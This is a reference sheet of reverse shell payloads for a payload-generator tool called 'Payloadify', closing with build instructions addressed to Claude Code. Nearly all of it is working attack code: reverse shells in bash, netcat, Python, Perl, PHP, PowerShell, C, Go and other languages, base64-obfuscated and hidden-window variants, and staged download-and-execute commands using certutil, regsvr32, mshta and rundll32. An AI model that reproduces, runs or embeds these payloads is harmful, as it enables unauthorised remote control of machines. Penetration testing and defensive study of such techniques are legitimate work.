# Reverse Shell Payload Reference — for Payloadify

Placeholders used throughout: `LHOST` = attacker IP, `LPORT` = attacker listening port.
Template this into the generator's existing input fields the same way current payloads work.

Excludes: Dash-specific revshell (per project decision).

---

## LINUX

### Netcat variants
```
# Classic nc with -e (traditional-nc / nc.traditional)
nc -e /bin/sh LHOST LPORT

# nc without -e support (mkfifo method)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f

# ncat with SSL/TLS
ncat --ssl LHOST LPORT -e /bin/sh

# OpenBSD netcat (no -e flag, uses -c)
nc -c /bin/sh LHOST LPORT
```

### Bash
```
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

# base64-obfuscated variant
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9MUE9SVCAwPiYx" | base64 -d | bash
```

### Zsh (Linux/Mac)
```
zsh -c 'zmodload zsh/net/tcp && ztcp LHOST LPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

### Python (2 and 3)
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

### Perl
```
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# No /bin/sh -i dependency variant (Perl without -e using fork)
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Ruby
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","LPORT");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### PHP
```
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# exec/proc_open variant (if fsockopen disabled but exec allowed)
php -r '$sock=fsockopen("LHOST",LPORT);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### Java
```java
// requires target has Java runtime; compile or use as inline exec via Runtime
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Golang
```go
// go run reverseshell.go  (requires Go installed on target)
package main
import("net";"os/exec";"os")
func main(){
  c,_ := net.Dial("tcp","LHOST:LPORT")
  cmd := exec.Command("/bin/sh")
  cmd.Stdin = c
  cmd.Stdout = c
  cmd.Stderr = c
  cmd.Run()
  _ = os.Getenv("SHELL")
}
```

### C (POSIX sockets — Linux/Mac compatible, compile with gcc/cc)
```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(LPORT);
    revsockaddr.sin_addr.s_addr = inet_addr("LHOST");

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char *const argvv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argvv, NULL);
    return 0;
}
// compile: gcc revshell.c -o revshell
```

### Dart (requires `dart` runtime on target)
```dart
import 'dart:io';
main() {
  Socket.connect("LHOST", LPORT).then((socket) {
    socket.listen((data) {
      Process.start('/bin/sh', []).then((process) {
        process.stdin.add(data);
        process.stdout.listen((d) => socket.add(d));
      });
    });
  });
}
```

### Crystal (requires `crystal` runtime, or compile ahead of time)
```crystal
require "socket"
require "process"

sock = TCPSocket.new("LHOST", LPORT)
while cmd = sock.gets
  output = Process.run("/bin/sh", ["-c", cmd], output: Process::Redirect::Pipe) do |proc|
    proc.output.gets_to_end
  end
  sock.puts(output)
end
```

### Lua
```lua
lua5.1 -e 'local host,port="LHOST",LPORT
local socket=require("socket")
local tcp=socket.tcp()
tcp:connect(host,port)
while true do
  local cmd,status,partial=tcp:receive()
  local f=io.popen(cmd,"r")
  local s=f:read("*a")
  f:close()
  tcp:send(s)
  if status=="closed" then break end
end
tcp:close()'
```

### Node.js (if present on target)
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(LPORT, "LHOST", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

### Deno (if present)
```javascript
const conn = await Deno.connect({ hostname: "LHOST", port: LPORT });
const process = Deno.run({
  cmd: ["/bin/sh"],
  stdin: "piped",
  stdout: "piped",
  stderr: "piped",
});
await Promise.all([
  conn.readable.pipeTo(process.stdin.writable),
  process.stdout.readable.pipeTo(conn.writable),
]);
```

---

## MAC (macOS)

Most Python, Perl, Ruby, PHP, Java, Golang, C (adjust headers if needed), Node.js, Lua, and zsh
payloads above work unmodified on Mac since macOS is POSIX/BSD-based. Differences below.

### Bash/zsh note
macOS ships zsh as default shell since Catalina — prefer the zsh /dev/tcp variant below over bash
since default bash on Mac is an old 3.2 build:
```
zsh -c 'zmodload zsh/net/tcp && ztcp LHOST LPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```

### BSD-flavored Netcat (Mac ships BSD nc, not GNU nc — no -e flag by default)
```
mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc LHOST LPORT > /tmp/f; rm /tmp/f
```

### Swift (Mac-native language, if swift toolchain present — genuinely Mac-specific, not on revshells.com)
```swift
import Foundation

let task = Process()
task.launchPath = "/bin/sh"
let inPipe = Pipe(), outPipe = Pipe()
task.standardInput = inPipe
task.standardOutput = outPipe
task.standardError = outPipe
task.launch()

// pair pipes with a raw socket connection to LHOST:LPORT via BSD sockets APIs
// (full socket wiring omitted here — flag as "needs socket plumbing" in the tool)
```

### osascript / AppleScript-triggered shell (Mac-specific, worth adding as a novelty option)
```
osascript -e 'do shell script "nc -e /bin/sh LHOST LPORT"'
```

---

## WINDOWS

### PowerShell — plain
```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### PowerShell — base64/-EncodedCommand
```powershell
powershell -nop -w hidden -e <BASE64_ENCODED_PAYLOAD_HERE>
# Tool should auto-generate the base64 blob from the plain PowerShell payload above
```

### PowerShell — TLS/encrypted variant
```powershell
$Socket = New-Object System.Net.Sockets.TcpClient("LHOST", LPORT)
$Stream = $Socket.GetStream()
$SslStream = New-Object System.Net.Security.SslStream($Stream, $false, ({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$SslStream.AuthenticateAsClient("LHOST")
[byte[]]$Bytes = 0..65535 | ForEach-Object {0}
while (($I = $SslStream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {
    $Data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes, 0, $I)
    $SendBack = (Invoke-Expression $Data 2>&1 | Out-String)
    $SendBack2 = $SendBack + "PS " + (Get-Location).Path + "> "
    $SendByte = ([Text.Encoding]::ASCII).GetBytes($SendBack2)
    $SslStream.Write($SendByte, 0, $SendByte.Length)
    $SslStream.Flush()
}
# NOTE: attacker listener must be set up with a matching TLS cert
# (e.g. `ncat --ssl -lvp LPORT` or openssl s_server) for this to connect.
```

### PowerShell Core (pwsh) — Windows AND Linux/Mac if installed
```powershell
# Identical syntax to plain PowerShell above, just invoked via `pwsh` instead of `powershell`
pwsh -nop -w hidden -c "<same TCPClient payload as plain PowerShell above>"
```

### cmd.exe + certutil (download and execute staged payload — requires hosting a file)
```
certutil -urlcache -split -f http://LHOST:8080/shell.exe shell.exe && shell.exe
```

### nc.exe (Windows netcat binary — NOT built into Windows, must be dropped/staged first)
```
nc.exe -e cmd.exe LHOST LPORT
```

### ncat.exe (bundled with Nmap for Windows — also not built-in, but common on pentest-dropped toolsets)
```
ncat.exe LHOST LPORT -e cmd.exe
ncat.exe --ssl LHOST LPORT -e cmd.exe
```

### rundll32 (staged DLL execution)
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -w hidden -e <BASE64_PAYLOAD>")
```

### mshta
```
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -nop -w hidden -e <BASE64_PAYLOAD>"", 0 : window.close")
```

### regsvr32 (Squiblydoo technique — requires hosting a malicious .sct file)
```
regsvr32 /s /n /u /i:http://LHOST:8080/payload.sct scrobj.dll
```

### VBScript (.vbs)
```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -nop -w hidden -e <BASE64_PAYLOAD>", 0, False
```

### JScript (.js, run via cscript/wscript)
```javascript
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -nop -w hidden -e <BASE64_PAYLOAD>", 0, false);
```

### Python for Windows (if Python installed on target)
```python
# Same cross-platform Python payload as the Linux section works unmodified on Windows,
# just swap the pty.spawn("/bin/sh") call — Windows has no pty module, so use subprocess instead:
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('LHOST',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe'])"
```

### C for Windows (Winsock — different API from POSIX, treat as separate payload from Linux/Mac C)
```c
#include <winsock2.h>
#pragma comment(lib,"ws2_32")

int main(void) {
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in hax;
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;
    WSAStartup(MAKEWORD(2,2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    struct hostent *host;
    host = gethostbyname("LHOST");
    hax.sin_family = AF_INET;
    hax.sin_port = htons(LPORT);
    hax.sin_addr = *((struct in_addr *)host->h_addr);

    WSAConnect(Winsock, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
    return 0;
}
// compile: x86_64-w64-mingw32-gcc revshell.c -o revshell.exe -lws2_32
```

### Java for Windows (same JVM code as Linux Java payload, just swap exec target)
```java
r = Runtime.getRuntime()
p = r.exec(["cmd.exe","/c","powershell -nop -w hidden -e <BASE64_PAYLOAD>"] as String[])
p.waitFor()
```

### Golang for Windows (same Go code as Linux, swap exec.Command target)
```go
package main
import("net";"os/exec")
func main(){
  c,_ := net.Dial("tcp","LHOST:LPORT")
  cmd := exec.Command("cmd.exe")
  cmd.Stdin = c
  cmd.Stdout = c
  cmd.Stderr = c
  cmd.Run()
}
```

---

## Build notes for Claude Code

- Wire every payload above into the existing LHOST/LPORT input fields the same
  way current payload templates work.
- Add the one-line prerequisite comment shown inline with each payload
  (e.g. "requires Go installed on target", "requires nc.exe staged on target
  first, not built into Windows") into the UI as a small note/tooltip next
  to that payload option.
- PowerShell TLS variant needs a UI note that the attacker listener must
  also be TLS-configured to receive the connection.
- Windows C and Linux/Mac C are DIFFERENT payloads (Winsock vs POSIX sockets)
  — do not merge them into one template.
- Once implemented, output a full table: OS | Language/Type | Prerequisite
  notes, so I can manually spot-check a sample against known-good syntax.
